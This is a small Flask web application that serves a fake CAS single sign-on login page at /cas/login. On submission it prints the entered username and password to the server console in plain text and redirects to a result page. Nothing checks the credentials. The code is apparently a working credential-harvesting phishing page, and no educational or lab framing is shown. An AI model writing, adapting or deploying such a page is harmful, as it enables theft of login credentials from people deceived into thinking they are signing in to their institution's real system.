from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')


@app.route("/cas/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        print("--------------------------")
        print("Username: " + username)
        print("Password: " + password)
        print("--------------------------")
        return redirect("/cas/result")

    return render_template('login.html')


@app.route("/cas/result")
def result():
    return render_template('result.html')


if __name__ == "__main__":
    app.run(debug=True)
